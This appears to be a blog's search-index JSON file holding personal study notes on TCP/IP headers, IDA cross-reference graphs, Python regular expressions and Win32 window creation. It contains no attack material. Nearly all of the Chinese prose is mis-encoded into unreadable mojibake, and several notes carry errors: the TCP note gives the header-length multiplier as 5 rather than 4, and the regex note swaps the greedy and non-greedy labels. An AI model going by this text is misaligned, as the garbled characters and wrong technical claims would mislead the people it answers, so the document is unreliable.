{"meta":{"title":"Fish","subtitle":"","description":"","author":"Fish","url":"http://example.com","root":"/"},"pages":[{"title":"Categories","date":"2020-02-02T12:00:02.000Z","updated":"2021-08-08T08:29:35.429Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"äº”é‡‘ç›’","date":"2021-08-07T16:00:00.000Z","updated":"2021-08-08T08:39:58.677Z","comments":true,"path":"tools/index.html","permalink":"http://example.com/tools/index.html","excerpt":"","text":""},{"title":"Tags","date":"2021-08-08T08:29:30.352Z","updated":"2021-08-08T08:29:30.352Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"TCP/IP","date":"2021-08-08T09:19:19.506Z","updated":"2021-08-08T09:19:19.506Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/NetWork/TCP.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/NetWork/TCP.html","excerpt":"","text":"IPå¸¸ç”¨çš„ä¸‰ç§ç±»åˆ«IPåœ°å€åœ°å€è§£æåè®®ARPIPæ•°æ®åŒ…æ ¼å¼å­ç½‘åˆ’åˆ† å­ç½‘å·ä¸èƒ½ä¸ºå…¨0æˆ–å…¨1 åˆ¤æ–­ä¸¤å°ä¸»æœºæ˜¯å¦åœ¨åŒä¸€ç½‘æ®µï¼Œæœ¬ä¸»æœºçš„å­ç½‘æ©ç ä¸å¯¹æ–¹çš„IPåœ°å€è¿›è¡Œä¸è¿ç®—ï¼Œåœ¨ä¸è‡ªå·±çš„ç½‘ç»œå·è¿›è¡Œæ¯”è¾ƒ å­ç½‘æ©ç è¶…ç½‘åˆ’åˆ†ï¼ˆæ— åˆ†ç±»ç¼–å€CIDRï¼‰æ— åˆ†ç±»çš„äºŒçº§ç¼–å€ï¼ˆ**IPåœ°å€ ::= {&lt;ç½‘ç»œå‰ç¼€&gt;,&lt;ä¸»æœºå·&gt;}**ï¼‰ ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®ICMPTCP å„å­—æ®µæ„ä¹‰åºå·å¦‚æœæŠ¥æ–‡æ•°æ®éƒ¨åˆ†é•¿åº¦ä¸º0ï¼Œåˆ™é»˜è®¤å¢åŠ 1ä¸ªå­—èŠ‚ å 4å­—èŠ‚ é¦–å…ˆï¼Œåœ¨ä¼ è¾“è¿‡ç¨‹çš„æ¯ä¸€ä¸ªå­—èŠ‚éƒ½ä¼šæœ‰ä¸€ä¸ªç¼–å· åœ¨å»ºç«‹è¿æ¥åï¼Œåºå·ä»£è¡¨ï¼šè¿™ä¸€æ¬¡ä¼ ç»™å¯¹æ–¹çš„TCPæ•°æ®éƒ¨åˆ†çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„ç¼–å· ç¡®è®¤å·å½“æ ‡å¿—ä½ä¸­çš„ACKä¸º1æ—¶ï¼Œç¡®è®¤å·æ‰æœ‰æ•ˆ å 4å­—èŠ‚ ç¡®è®¤æ”¶åˆ°å‰é¢çš„åŒ… åœ¨å»ºç«‹è¿æ¥åï¼ŒæœŸæœ›å¯¹æ–¹ä¸‹ä¸€æ¬¡å‘é€çš„TCPæ•°æ®éƒ¨åˆ†ç¬¬ä¸€ä¸ªå­—èŠ‚çš„å¼€å§‹åºå· æ•°æ®åç§» å 4ä¸ªbitï¼ˆå–å€¼èŒƒå›´ä¸º5~15ï¼‰ Header Lengthä¹˜5ç­‰äºTCPé¦–éƒ¨é•¿åº¦ï¼ˆä¹Ÿç­‰äºæ•°æ®åç§»ï¼‰ é¦–éƒ¨é•¿åº¦èŒƒå›´ï¼ˆ20~60ï¼‰ ä¿ç•™ å 6ä¸ªbitï¼Œä¸€èˆ¬æƒ…å†µä¸‹å…¨ä¸º0 U/A/P/R/S/F URGï¼ˆUrgentï¼‰å½“URG = 1æ—¶ï¼Œç´§æ€¥æŒ‡é’ˆå­—æ®µæ‰æœ‰æ•ˆã€‚è¡¨æ˜å½“å‰æŠ¥æ–‡æ®µä¸­æœ‰ç´§æ€¥æ•°æ®ï¼Œåº”ä¼˜å…ˆå°½å¿«ä¼ é€ ACKï¼ˆAcknowledgmentï¼‰å½“ACK = 1æ—¶ï¼Œç¡®è®¤å·å­—æ®µæ‰æœ‰æ•ˆ PSHï¼ˆPushï¼‰RSTï¼ˆResetï¼‰å½“RST = 1æ—¶ï¼Œè¡¨æ˜è¿æ¥ä¸­å‡ºç°ä¸¥é‡å·®é”™ï¼Œå¿…é¡»é‡Šæ”¾è¿æ¥ï¼Œç„¶åå†é‡æ–°å»ºç«‹è¿æ¥ SYNï¼ˆSynchronizationï¼‰å½“SYN = 1ã€ACK = 0 æ—¶ï¼Œè¡¨æ˜è¿™æ˜¯ä¸€ä¸ªå»ºç«‹è¿æ¥çš„è¯·æ±‚è‹¥å¯¹æ–¹åŒæ„å»ºç«‹è¿æ¥ï¼Œåˆ™å›å¤SYN = 1ã€ACK = 1 FINï¼ˆFinishï¼‰å½“FIN = 1æ—¶ï¼Œè¡¨æ˜æ•°æ®å·²ç»å‘é€å®Œæ¯•ï¼Œè¦æ±‚é‡Šæ”¾è¿æ¥ çª—å£æ£€éªŒå’Œ ä¼ªé¦–éƒ¨+é¦–éƒ¨+æ•°æ®éƒ¨åˆ† ä¼ªé¦–éƒ¨ä¸ä¼šä¼ è¾“ç»™ä¸‹ä¸€å±‚ ç´§æ€¥æŒ‡é’ˆå¯é ä¼ è¾“ARQï¼ˆAutomatic Repeat-reQuestï¼‰ ç†æƒ³æƒ…å†µ æ„å¤–æƒ…å†µ ç¡®è®¤ä¸¢å¤± ç¡®è®¤è¿Ÿåˆ° ç¼ºç‚¹ï¼šæ•ˆç‡éå¸¸ä½ è¿ç»­ARQ+æ»‘åŠ¨çª—å£ SACKï¼ˆselective é€‰æ‹©æ€§ç¡®è®¤ï¼‰ åŒ…å«äºTCPé¦–éƒ¨å¯é€‰éƒ¨åˆ† æ„å¤–æƒ…å†µ æµé‡æ§åˆ¶æ‹¥å¡æ§åˆ¶å»ºç«‹è¿æ¥ &amp;&amp; é‡Šæ”¾è¿æ¥ ä¸‰æ¬¡æ¡æ‰‹ ç¬¬ä¸€æ¬¡æ¡æ‰‹ ç¬¬äºŒæ¬¡æ¡æ‰‹ ç¬¬ä¸‰æ¬¡æ¡æ‰‹ å››æ¬¡æŒ¥æ‰‹ å°†2ï¼Œ3æ¬¡æŒ¥æ‰‹åˆå¹¶"},{"title":"about","date":"2021-08-08T08:44:58.000Z","updated":"2021-08-08T08:44:58.351Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"ğŸ•µï¸â€â™‚ï¸IDAä¸­äº¤å‰å¼•ç”¨å’Œç»˜å›¾åŠŸèƒ½","date":"2021-08-08T08:46:15.105Z","updated":"2021-08-08T08:46:15.105Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/IDA/IDAäº¤å‰å¼•ç”¨ä¸ç»˜å›¾åŠŸèƒ½.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/IDA/IDA%E4%BA%A4%E5%8F%89%E5%BC%95%E7%94%A8%E4%B8%8E%E7%BB%98%E5%9B%BE%E5%8A%9F%E8%83%BD.html","excerpt":"","text":"æ–‡ç« æ‰€ä½¿ç”¨æºç  12345678910111213141516171819#include &lt;stdio.h&gt;void depth_2_1() &#123; printf(&quot;inside depth_2_1\\n&quot;);&#125;void depth_2_2() &#123; fprintf(stderr, &quot;inside depth_2_2\\n&quot;);&#125;void depth_1() &#123; depth_2_1(); depth_2_2(); printf(&quot;inside depth_1\\n&quot;);&#125;int main() &#123; depth_1();&#125; äº¤å‰å¼•ç”¨äº¤å‰å¼•ç”¨åˆ†ä¸ºä¸¤ç§ç±»å‹ ä»£ç äº¤å‰å¼•ç”¨ æ•°æ®äº¤å‰å¼•ç”¨ äº¤å‰å¼•ç”¨æºå¤´è§£é‡Šäº¤å‰å¼•ç”¨æºå¤´ä¸€å…±æœ‰4ä¸ªéƒ¨åˆ†ç»„æˆ` ç»„æˆ1ï¼šå¼•ç”¨è€…åå­— è¡¨ç¤ºæ˜¯åœ¨**___tmainCRTStartup**çš„å‡½æ•°ä¸­æå‡ºå¼•ç”¨ ç»„æˆ2ï¼šå¼€å§‹å­—èŠ‚ 15Aè¡¨ç¤ºå¼•ç”¨å¼€å§‹æ˜¯åœ¨å‡½æ•°çš„ç¬¬0x15Aä¸ªå­—èŠ‚å¤„ ç»„æˆ3ï¼šå¼•ç”¨ä½ç½®ç›¸å¯¹ç›®å‰çš„ä½ç½® ç®­å¤´è¡¨ç¤ºå¼•ç”¨ä½ç½®çš„ç›¸å¯¹æ–¹å‘ï¼Œå›¾ä¸­ç®­å¤´å‘ä¸‹ï¼Œè¡¨ç¤ºæ“ä½œè€…éœ€è¦å‘ä¸‹æ»‘åŠ¨æ‰å¯ä»¥çœ‹åˆ°ï¼Œåä¹‹äº¦ç„¶ ç»„æˆ4ï¼šè¯†åˆ«åç¼€ åœ¨IDAä¸­ï¼ŒæŒ‡ä»¤è½¬äº¤æ§åˆ¶æƒçš„æ–¹å¼å«åšæµã€‚IDAä¸­æœ‰3ä¸­åŸºæœ¬æµï¼šæ™®é€šæµï¼Œè·³è½¬æµï¼ŒåŸºæœ¬æµ ç±»å‹ è‹±æ–‡åç§° æ™®é€šæµ ordinary flow è·³è½¬æµ jump flow è°ƒç”¨æµ call flow åç¼€æ„ä¹‰ ç¬¦å· å¼•ç”¨æ–¹å¼ å…¨ç§° p ä»£ç äº¤å‰å¼•ç”¨ Procedure w å†™å…¥äº¤å‰å¼•ç”¨ write r è¯»å–äº¤å‰å¼•ç”¨ read o åç§»äº¤å‰å¼•ç”¨ offset(åç§») äº¤å‰å¼•ç”¨åˆ—è¡¨ å¿«æ·é”®Xï¼Œå¯ä»¥æ˜¾ç¤ºæ‰€æœ‰çš„äº¤å‰å¼•ç”¨æºï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œwrite_itåªè¢«è°ƒç”¨äº†ä¸‰æ¬¡ å‡½æ•°åˆ—è¡¨ å‡½æ•°å¤–éƒ¨è°ƒç”¨å›¾ IDAå‡½æ•°è°ƒç”¨å›¾ å¤–éƒ¨äº¤å‰å¼•ç”¨å›¾å¤–éƒ¨äº¤å‰å¼•ç”¨æœ‰ä¸¤ç§ç±»å‹ ç›®æ ‡ç¬¦å·äº¤å‰å¼•ç”¨ [Xrefs To] æºç¬¦å·äº¤å‰å¼•ç”¨ [Xrefs From] Xrefs Toâ€‹ IDAç”Ÿæˆâ€œäº¤å‰å¼•ç”¨ç›®æ ‡â€å›¾å½¢ï¼Œå¿…é¡»æ‰§è¡Œé€’å½’ä¸Šå‡æ“ä½œï¼Œå³å›æº¯æ‰€æœ‰ä»¥é€‰å®šç›®æ ‡çš„ç¬¦å·ä¸ºç›®æ ‡çš„äº¤å‰å¼•ç”¨ï¼Œç›´åˆ°åˆ°è¾¾ä¸€ä¸ªæ²¡æœ‰å…¶ä»–ç¬¦å·å¼•ç”¨çš„ç¬¦å· putså‡½æ•°(printfå‡½æ•°)XrefsToå›¾å½¢ï¼Œæ˜¾ç¤ºäº†æ‰€æœ‰åˆ°è¾¾putså‡½æ•°çš„è·¯å¾„ Xrefs Fromâ€‹ ç”Ÿæˆâ€œäº¤å‰å¼•ç”¨æºå¤´â€å›¾ï¼Œéœ€è¦æ‰§è¡Œé€’å½’ä¸‹é™æ“ä½œï¼Œå³è·Ÿè¸ªæ‰€æœ‰ä»¥é€‰å®šçš„ç¬¦å·ä¸ºæºå¤´çš„äº¤å‰å¼•ç”¨ mainå‡½æ•°â€œäº¤å‰å¼•ç”¨æºå¤´å›¾â€ depth_1å‡½æ•°â€œäº¤å‰å¼•ç”¨æºå¤´å›¾â€ ç®€å•ç†è§£ Toè¡¨ç¤ºæºå¤´ï¼ŒIDAå¯ä»¥é€’å½’å‡ºæ‰€æœ‰åˆ°è¾¾è¯¥æºå¤´çš„è·¯å¾„ Fromè¡¨ç¤ºç›®æ ‡ï¼ŒIDAä»é€‰å®šå¤„æºå¤´å¼€å§‹é€’å½’ï¼Œæ‰¾åˆ°ä»ä»æºå¤´å¼€å§‹çš„æ‰€æœ‰è·¯å¾„ å¯¹IDAæ¥è¯´æ¥è¯´Toå°±æ˜¯IDAä»ç›®æ ‡å¤„å‘ä¸Šé€’å½’ï¼ŒFromå°±æ˜¯IDAä»ç›®æ ‡å¤„å‘ä¸‹é€’å½’"},{"title":"Pythonæ­£åˆ™è¡¨è¾¾å¼ç»ƒä¹ ","date":"2021-08-08T09:15:03.089Z","updated":"2021-08-08T09:15:03.089Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/Python/Python-re.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/Python/Python-re.html","excerpt":"","text":"å­—ç¬¦åˆ†ç±» \\d â€”â€“ 0-9çš„ä»»ä½•æ•°å­— \\D â€”â€“ é™¤å¼€0-9çš„ä»»ä½•æ•°å­— \\w â€”â€“ ä»»ä½•å­—æ¯ï¼Œæ•°å­—æˆ–ä¸‹åˆ’çº¿å­—ç¬¦ \\W â€”â€“ é™¤å¼€å­—æ¯ï¼Œæ•°å­—å’Œä¸‹åˆ’çº¿ä»¥å¤–çš„ä»»ä½•å­—ç¬¦ \\s â€”â€“ ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦æˆ–æ¢è¡Œç¬¦ \\S â€”â€“ é™¤ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦å’Œæ¢è¡Œç¬¦ä»¥å¤–çš„ä»»ä½•å­—ç¬¦ æ­£åˆ™è¡¨è¾¾å¼åŸºç¡€12import re # åé¢çš„ä»£ç ä¸­å°†é»˜è®¤å¼•å…¥msg = &#x27;My number is 415-555-4242 and 111-222-3333&#x27; # ä¸‹é¢ä¾‹å­ä¸­æ‰€ä½¿ç”¨çš„æµ‹è¯•å­—ç¬¦ä¸² example_1 123456# searchå’Œfindallçš„ä½¿ç”¨phoneNumRegex = re.compile(r&#x27;\\d\\d\\d-\\d\\d\\d-\\d\\d\\d\\d&#x27;)mo_1 = phoneNumRegex.search(msg)mo_2 = phoneNumRegex.findall(msg) # findallæ–¹æ³•è¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œé‡Œé¢å­˜å‚¨æ‰€æœ‰çš„æ­£åˆ™åŒ¹é…æ•°æ®print(mo_1.group())print(mo_2[0]) 12search: 415-555-4242findall: [&#x27;415-555-4242&#x27;, &#x27;111-222-3333&#x27;] example_2 1234567# ç”¨æ‹¬å·åˆ†ç»„phoneNumRegex = re.compile(r&#x27;(\\d\\d\\d)-(\\d\\d\\d-\\d\\d\\d\\d)&#x27;) # åŠ æ‹¬å·ä¼šè¿”å›ä¸€ä¸ªå…ƒç¥–mo_1 = phoneNumRegex.search(msg) # å°†æ­£åˆ™åŒ¹é…åˆ°çš„æ•°æ®ç”¨æ‹¬å·ç»™å®šçš„èŒƒå›´åˆ†ç»„ï¼Œæ‰“åŒ…æˆå…ƒç¥–mo_2 = phoneNumRegex.findall(msg) # findallå°†æ‰€æœ‰æ‰“åŒ…å¥½çš„å…ƒç¥–å­˜æ”¾åˆ°åˆ—è¡¨ä¸­print(&#x27;mo_1 -&gt; group(0): &#x27;,mo_1.group(0))print(&#x27;mo_1 -&gt; group(1) and group(2): &#x27;,mo_1.group(1),mo_1.group(2))print(&#x27;mo_2: &#x27;,mo_2) 123mo_1 -&gt; group(0): 415-555-4242mo_1 -&gt; group(1) and group(2): 415 555-4242mo_2: [(&#x27;415&#x27;, &#x27;555-4242&#x27;), (&#x27;111&#x27;, &#x27;222-3333&#x27;)] example_3 123456# ç®¡é“ç¬¦å·çš„ä½¿ç”¨msg = &#x27;Tina Fey and Batman.&#x27;heroRegex = re.compile(r&#x27;Batman|Tina Fey&#x27;) # |ä¸ºç®¡é“ç¬¦å·ï¼Œå¦‚æœä½¿ç”¨searchæ–¹æ³•åªåŒ¹é…åˆ°æœ€è¿‘çš„ä¸€ä¸ªï¼Œfinddownä¼šå°†å¯é€‰é¡¹å…¨éƒ¨åŒ¹é…mo_1 = heroRegex.search(msg)mo_2 = heroRegex.findall(msg)print(&#x27;mo_1.group(): &#x27;,mo_1.group()) 12mo_1.group(): Tina Feymo_2: [&#x27;Tina Fey&#x27;, &#x27;Batman&#x27;] example_4 1234# ç®¡é“ç¬¦å·å¤šæ¨¡å¼åŒ¹é…batRegex = re.compile(r&#x27;Bat(man|mobile|copter|bat)&#x27;) # è‹¥å‰ç¼€ç›¸åŒåˆ™åç¼€éƒ¨åˆ†å¯ä»¥ç”¨æ‹¬å·ä¸ç®¡é“ç¬¦å°†å…¶åˆ†å¼€ï¼Œå‡å°‘è¾“å…¥mo = batRegex.search(&#x27;Batmobile lost a wheel&#x27;)print(&#x27;mo.group&#x27;, mo.group()) 1mo.group(): Batmobile example_5 1234# é—®å·å®ç°å¯é€‰åŒ¹é…batRegex = re.compile(r&#x27;Bat(wo)?man&#x27;) # ç®€å•æ¥è¯´ï¼Œæ‹¬å·é‡Œé¢çš„å­˜åœ¨åŒ¹é…æ—¶å°±åŠ ä¸Šï¼Œä¸å­˜åœ¨å°±å¿½ç•¥æ‹¬å·é‡Œé¢çš„mo = batRegex.search(&#x27;The Adventures of Batman&#x27;)print(&#x27;output: &#x27;,mo.group()) 1output: Batman example_6 1234# ç”¨*å·å®ç°å¤šæ¬¡åŒ¹é…batRegex = re.compile(r&#x27;Bat(wo)*man&#x27;) # *å·ä»£è¡¨ç¼ºçœmo = batRegex.search(&#x27;The Adventures of Batwowowowowoman&#x27;)print(&#x27;output: &#x27;,mo.group()) 1output: Batwowowowowoman 12## ç”¨+å·åŒ¹é…ä¸€æ¬¡æˆ–å¤šæ¬¡batRegex = re.compile(r&#x27;Bat(wo)+man&#x27;) # +å·éœ€è¦æ‹¬å·ä¸­çš„å†…å®¹è‡³å°‘å‡ºç°ä¸€æ¬¡ example_7 12345# ç”¨èŠ±æ‹¬å·åŒ¹é…ç‰¹å®šçš„æ¬¡æ•°haRegex = re.compile(r&#x27;Ha&#123;3&#125;&#x27;) # æŒ‡å®šä¸‰æ¬¡haRegex = re.compile(r&#x27;Ha&#123;3,5&#125;&#x27;) # æœ‰å­˜åœ¨3-5ä¸ªçš„éƒ½å¯ä»¥haRegex = re.compile(r&#x27;Ha&#123;,5&#125;&#x27;) # åŒ¹é…0-5ä¸ªhaRegex = re.compile(r&#x27;Ha&#123;3,&#125;&#x27;) # åŒ¹é…3æˆ–æ›´å¤šæ¬¡ example_8 12345678910# example_6 è´ªå¿ƒåŒ¹é…å’Œéè´ªå¿ƒåŒ¹é… (å¥½åƒåœ¨python3.8ç‰ˆæœ¬ä¸­è¢«åºŸå¼ƒï¼Ÿ)## è´ªå¿ƒgreedyHaRegex = re.compile(r&#x27;(Ha)&#123;3, 5&#125;?&#x27;)mo1 = greedyHaRegex.search(&#x27;HaHaHaHaHa&#x27;)print(mo1) ## è¾“å‡ºæŠ¥é”™## éè´ªå¿ƒnotGreedyHaRegex = re.compile(r&#x27;(Ha)&#123;3,5&#125;&#x27;)mo2 = notGreedyHaRegex.search(&#x27;HaHaHaHaHa&#x27;)print(mo2) ## è¾“å‡ºæŠ¥é”™ å»ºç«‹å­—ç¬¦åˆ†ç±» example_1 123vowelRegex = re.compile(r&#x27;[aeiouAEIOU]&#x27;) # ä¸­æ‹¬å·ä¸­å°±æ˜¯ç”¨æˆ·éœ€è¦åŒ¹é…çš„å­—ç¬¦mo = vowelRegex.findall(&#x27;RoboCop eats baby food. BABY FOOD.&#x27;)print(&quot;Output: &quot;, mo) 1Output: [&#x27;o&#x27;, &#x27;o&#x27;, &#x27;o&#x27;, &#x27;e&#x27;, &#x27;a&#x27;, &#x27;a&#x27;, &#x27;o&#x27;, &#x27;o&#x27;, &#x27;A&#x27;, &#x27;O&#x27;, &#x27;O&#x27;] 123vowelRegex = re.compile(r&#x27;[^aeiouAEIOU]&#x27;) # å¦‚æœåœ¨å‰é¢åŠ ä¸Š^ç¬¦å·å°±ä»£è¡¨ä¸åŒ¹é…è¿™äº›å­—ç¬¦mo = vowelRegex.findall(&#x27;RoboCop eats baby food. BABY FOOD.&#x27;)print(&quot;Output: &quot;, mo) 1Output: [&#x27;R&#x27;, &#x27;b&#x27;, &#x27;C&#x27;, &#x27;p&#x27;, &#x27; &#x27;, &#x27;t&#x27;, &#x27;s&#x27;, &#x27; &#x27;, &#x27;b&#x27;, &#x27;b&#x27;, &#x27;y&#x27;, &#x27; &#x27;, &#x27;f&#x27;, &#x27;d&#x27;, &#x27;.&#x27;, &#x27; &#x27;, &#x27;B&#x27;, &#x27;B&#x27;, &#x27;Y&#x27;, &#x27; &#x27;, &#x27;F&#x27;, &#x27;D&#x27;, &#x27;.&#x27;] example_2 1ext..."},{"title":"ğŸ¦Win32å­¦ä¹ è®°å½•(æ³¨å†Œ-åˆ›å»ºçª—å£)-1","date":"2021-08-08T08:46:15.111Z","updated":"2021-08-08T08:46:15.111Z","comments":true,"path":"ä¸æƒ³éƒ¨ç½²çš„/windows/Win32-1.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/windows/Win32-1.html","excerpt":"","text":"WIn32çª—å£åº”ç”¨ç¨‹åºä¸»å‡½æ•°:WinMain()123456int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) è¿™æ˜¯åœ¨Windowsä¸‹ç¼–å†™çš„ç¨‹åºå…¥å£ï¼Œä¸‹é¢å¯¹å‚æ•°é€ä¸ªè§£é‡Š hInstance hInstanceæ˜¯åº”ç”¨ç¨‹åºçš„å®ä¾‹å¥æŸ„ã€‚è¿™é‡Œçš„å®ä¾‹å¥æŸ„æ˜¯ç¨‹åºè£…å…¥å†…å­˜åçš„èµ·å§‹åœ°å€ã€‚ é€šè¿‡GetModuleHandle() å‚æ•°æ¥è·å¾—ã€‚ hPrevInstance åŒä¸€ä¸ªæ–‡ä»¶åˆ›å»ºçš„ä¸Šä¸€ä¸ªå®ä¾‹å¥æŸ„ã€‚è¿™ä¸ªå‚æ•°åœ¨Win32ä¸‹å·²ç»ä¸å†ä½¿ç”¨ã€‚ lpCmdLine ä¸»å‡½æ•°çš„å‚æ•°ï¼Œç”¨äºåœ¨ç¨‹åºå¯åŠ¨æ—¶ç»™è¿›ç¨‹ä¼ é€’å‚æ•° ç‚¹å‡»å¼€å§‹ï¼Œæ‰“å¼€è¿è¡Œçª—å£ï¼Œè¾“å…¥â€notepad C:\\boot.iniâ€ï¼Œè¿™ä¸ªå‘½ä»¤çš„ä½œç”¨ä¸ºå°†å­˜å‚¨åœ¨Cç›˜ç›®å½•ä¸‹çš„book.iniæ–‡ä»¶ç”¨è®°äº‹æœ¬æ–¹å¼æ‰“å¼€ï¼Œç‚¹å‡»ç¡®å®šï¼Œè®°äº‹æœ¬å¼¹å‡ºï¼Œç”±äºæˆ‘çš„Cç›˜ç›®å½•ä¸‹æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥æç¤ºæ–‡ä»¶ä¸å­˜åœ¨ã€‚ nCmdShow è¡¨ç¤ºè¿›ç¨‹æ˜¾ç¤ºæ–¹å¼ï¼Œå¯ä»¥ä¸ºæœ€å¤§åŒ–ï¼Œæœ€å°åŒ–ï¼Œéšè—ç­‰æ˜¾ç¤ºæ–¹å¼ã€‚ WinMainä¸­å‡½æ•°æµç¨‹æ³¨å†Œçª—å£ç±»ç¼–å†™Windowsç¨‹åºï¼ŒWinMain()å‡½æ•°çš„ä¸»è¦ä»»åŠ¡æ˜¯æ³¨å†Œä¸€ä¸ªçª—å£ç±»ï¼Œåˆ›å»ºä¸€ä¸ªçª—å£å¹¶æ˜¾ç¤ºåˆ›å»ºçš„çª—å£ï¼Œåœ¨ä¸åœçš„è·å–å±äºè‡ªå·±çš„æ¶ˆæ¯å¹¶åˆ†å‘ç»™è‡ªå·±çš„çª—å£ã€‚çŸ¥é“æ¥å—åˆ°WM_QUITæ¶ˆæ¯åé€€å‡ºå¾ªç¯ç»“æŸè¿›ç¨‹ã€‚ 1234567891011121314151617181920212223242526272829303132333435int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; // TODO: Place code here. MSG Msg; BOOL bRet; //æ³¨å†Œçª—å£ç±» MyRegisterClass(hInstance); //åˆ›å»ºçª—å£å¹¶æ˜¾ç¤ºçª—å£ if(!InitInstance(hInstance, SW_SHOWNORMAL)) return FALSE; //æ¶ˆæ¯å¾ªç¯ //è·å–å±äºè‡ªå·±çš„æ¶ˆæ¯å¹¶è¿›è¡Œåˆ†å‘ while( (bRet = GetMessage(&amp;Msg, NULL, 0, 0) != 0 ) &#123; if(bRet == -1) &#123; //handle the error and possibly exit //å¥æŸ„é”™è¯¯å¼ºåˆ¶é€€å‡º break; &#125; else &#123; TranslateMessage(&amp;Msg); DispatchMessage(&amp;Msg); &#125; &#125; return Msg.wParam;&#125; ä¸‹é¢å¯¹éƒ¨åˆ†å‡½æ•°çš„ä½œç”¨è¿›è¡Œè§£é‡Š GetMessageMSDNå¯¹äºè¯¥å‡½æ•°å‚æ•°çš„è§£é‡Š 123456BOOL GetMessage( LPMSG lpMsg, // message information HWND hWnd, // handle to window UINT wMsgFilterMin, // first message UINT wMsgFilterMax // last message); è¿™ä¸ªå‡½æ•°ç”¨æ¥è·å–å±äºè‡ªå·±çš„æ¶ˆæ¯ï¼Œå¹¶å¡«å……MSGç»“æ„ä½“ TranslateMessage1BOOL TranslateMessage( CONST MSG *lpMsg // message information); è¯¥å‡½æ•°ç”¨äºå¤„ç†é”®ç›˜æ¶ˆæ¯ã€‚å°†è™šæ‹Ÿç æ¶ˆæ¯è½¬æ¢ä¸ºå­—ç¬¦æ¶ˆæ¯ DispatchMessage1LRESULT DispatchMessage( CONST MSG *lpmsg // message information); è¯¥å‡½æ•°ä½œç”¨ä¸ºå°†æ¶ˆæ¯åˆ†å‘ç»™çª—å£ æ³¨å†Œçª—å£ç±»çš„è‡ªå®šä¹‰å‡½æ•°åœ¨WinMain()å‡½æ•°ä¸­ï¼Œé¦–å…ˆè°ƒç”¨çš„æ˜¯MyRegisterClasså‡½æ•°ï¼Œè¯¥å‡½æ•°æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œéœ€è¦ä¼ é€’è¿›ç¨‹çš„å®ä¾‹å¥æŸ„hInstanceä½œä¸ºå‚æ•°ã€‚ è¯¥å‡½æ•°å®Œæˆçª—å£ç±»çš„æ³¨å†Œåˆ†ä¸ºä¸¤æ­¥ï¼š å¡«å……WNDCLASSEXç»“æ„ä½“ ã€‚è¿™ä¸ªæ­¥éª¤è¾ƒä¸ºå¤æ‚ è°ƒç”¨RegisterClassExå‡½æ•°è¿›è¡Œæ³¨å†Œ ä¸‹é¢ä»£ç ä»‹ç»äº†WNDCLASSEXç»“æ„ä½“çš„æ‰€æœ‰æˆå‘˜ï¼Œå…¶ä¸­æœ€é‡è¦çš„å­—æ®µä¸ºlpfnWndProcï¼Œä»–å°†ä¿å­˜çª—å£çš„è¿‡ç¨‹åœ°å€ã€‚çª—å£çš„è¿‡ç¨‹æ˜¯å¯¹å„ç§æ¶ˆæ¯è¿›ç¨‹å¤„ç†çš„**â€æ±‡èšåœ°â€** 12345678910111213141516171819202122232425262728293031323334353637ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEX WndCls; //å¡«å……ç»“æ„ä½“ä¸º0 ZeroMemory(&amp;WndCls, sizeof(WNDCLASSEX)); //cbSizeæ˜¯ç»“æ„ä½“å¤§å° WndCls.cbSize = sizeof(WNDCLASSEX); //lpfnWndProcæ˜¯çª—å£è¿‡ç¨‹åœ°å€ WndCls.lpfnWndProc = WindowProc; //hInstanceæ˜¯å®ä¾‹å¥æŸ„ WndCls.hInstance = hInstance; //lpszClassNameæ˜¯çª—å£ç±»ç±»å WndCls.lpszClassName = CLASSNAME; //styleæ˜¯çª—å£ç±»é£æ ¼ WndCls.style = 0x01; //hbrBackgroundæ˜¯çª—å£ç±»èƒŒæ™¯è‰² WndCls.hbrBackground = (HBRUSH)COLOR_WINDOWRARME + 1; //hCursoræ˜¯é¼ æ ‡å¥æŸ„ WndCls.hCursor = LoadCursor(NULL, IDC_ARROW); //hIconæ˜¯å›¾æ ‡å¥æŸ„ WndCls.hIcon = LoadIcon(NULL, IDI_QUESTION); //å…¶ä»– WndCls.cbClsExtra = 0; WndCls.cbWndExtra = 0; return RegisterClassEx(&amp;WndCls);&#125; åˆ›å»ºä¸»çª—å£å¹¶æ˜¾ç¤ºæ›´æ–°æ³¨å†Œçª—å£ç±»åï¼Œæ ¹æ®è¯¥çª—å£ç±»åˆ›å»ºå…·ä½“çš„ä¸»çª—å£å¹¶æ˜¾ç¤ºå’Œæ›´æ–°çª—å£ 123456789101112131415161718192021222324252627282930//åˆ›å»ºçª—å£å‡½æ•°BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; HWND hWnd = NULL; //åˆ›å»ºçª—å£ hWnd = CreateWindowEx(WS_EX_CLIENTEDGE, &quot;HelloWin32&quot;, &quot;MyFirstWindow&quot;, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, //çª—å£å¼¹å‡ºçš„xè½´ CW_USEDEFAULT, //å¼¹å‡ºçš„yè½´ CW_USEDEFAULT, //çª—å£å®½ CW_USEDEFAULT, 